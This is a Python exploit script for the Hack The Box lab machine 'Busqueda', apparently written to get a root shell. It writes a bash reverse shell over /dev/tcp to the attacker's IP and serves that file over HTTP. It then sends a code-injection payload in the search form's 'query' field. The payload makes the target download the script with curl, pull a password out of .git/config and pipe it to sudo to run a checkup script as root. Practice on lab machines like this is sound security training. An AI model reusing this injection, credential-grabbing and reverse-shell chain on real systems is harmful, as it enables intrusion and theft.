#!/usr/bin/env python3

import http.server
import socketserver
import threading
import argparse
import requests
import subprocess
from colorama import Fore, Style

parser = argparse.ArgumentParser(prog='exploit_busqueda', description='Gain a root shell to the HTB Machine Busqueda')

parser.add_argument('local_ip')
parser.add_argument('port_num')
parser.add_argument('httpd_port')

args = parser.parse_args()

port = args.port_num

local_ip = args.local_ip

with open("full-checkup.sh", "w") as f:
    f.write("#!/bin/bash\n")
    f.write("\n")
    f.write(f"bash -c 'bash -i >& /dev/tcp/{local_ip}/{port} 0>&1'\n")

HTTPD_PORT = int(args.httpd_port)

def http_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTPD_PORT), Handler) as httpd:
        print(Fore.RED, f"Serving HTTP on port {HTTPD_PORT}...", Fore.RESET)
        httpd.serve_forever()

server_thread = threading.Thread(target=(http_server))
server_thread.start()

cmd = ['nc', '-nvlp', str(port)]

data = {"engine": "Accuweather", "query": f"Nothing',__import__('os').system('curl {local_ip}:{str(HTTPD_PORT)}/full-checkup.sh -o /tmp/full-checkup.sh;chmod +x /tmp/full-checkup.sh;cd /tmp; cat /var/www/app/.git/config |grep -Po \"http://[^:]*:\K[^@]+\" | sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup'),'"}

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

req = requests.get(url="http://searcher.htb")

subprocess.Popen(cmd)

r = requests.request(method="POST", url="http://searcher.htb/search", data=data, headers=headers)
